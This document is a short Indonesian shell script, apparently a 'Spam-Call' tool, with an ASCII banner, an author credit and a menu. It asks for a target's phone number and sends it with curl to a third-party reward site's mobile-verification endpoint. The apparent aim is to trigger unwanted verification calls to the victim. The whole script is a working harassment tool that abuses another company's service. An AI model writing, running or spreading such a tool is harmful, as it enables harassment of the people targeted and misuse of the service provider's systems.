 clear
#!/bin/sh
echo ======"╔════•ೋೋ•════╗
           SABAR
======╚════•ೋೋ•════╝" | lolcat

read -p "Siapa Nama Anda:" nama
sleep 1
echo "\033[0;32mSelamat Datang Tuan" $nama
echo "login..."
sleep 4
clear
figlet Spam-Call | lolcat
echo "\033[0;34m ======================="
echo "========================================="
echo "AUTHOR : TH4UF4N"
echo "LOKASI : Di Perangkatmu"
echo "TEAM   : ILUSION"
echo "\033[0;31mGithub : https/github.com/G3B0K-ID"
echo "========================================="
echo "        ========================"

echo "[1].Spam-Call"
echo "[2].Exit Tools"

echo
echo " TANPA NOMOR 0 LANGSUNG 8"
read -p "Masukan Pilihan Anda : " pil
if [ $pil = 1 ]
then
read -p "Masuka No Target : " nomor
link="https://id.jagreward.com/member/verify-mobile/$nomor"
curl -s $link
else
echo 'Terima Kasih'
exit
fi
